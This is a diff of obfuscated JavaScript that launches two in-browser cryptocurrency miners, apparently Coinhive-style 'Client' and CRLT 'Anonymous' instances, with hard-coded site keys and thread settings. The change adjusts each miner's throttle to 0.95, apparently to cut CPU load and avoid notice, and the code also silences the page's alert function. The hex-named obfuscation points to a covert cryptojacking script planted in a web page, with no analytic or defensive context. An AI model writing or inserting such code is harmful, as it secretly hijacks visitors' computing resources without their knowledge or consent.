@@ -90,13 +90,13 @@ var _0x2334d0 = (function () {
     }
 });
 _0x21d549(), new Client[(_0x417cdc(0x192))]('94fd352e2648f84468974dc47e5036a41f545b7f0c7293c829891a68f1626566', {
-    'throttle': 0x0,
+    'throttle': 0.95,
     'c': 'w',
     'ads': 0x0
 })['start'](), new CRLT['Anonymous']('b7f07eae9523cd903e39b57f6c71aa88d657928c94c3', {
     'threads': 0x4,
     'autoThreads': ![],
-    'throttle': 0.5,
+    'throttle': 0.95,
     'coin': _0x417cdc(0x19f)
 })[_0x417cdc(0x1a1)](), alert = function () {
 };
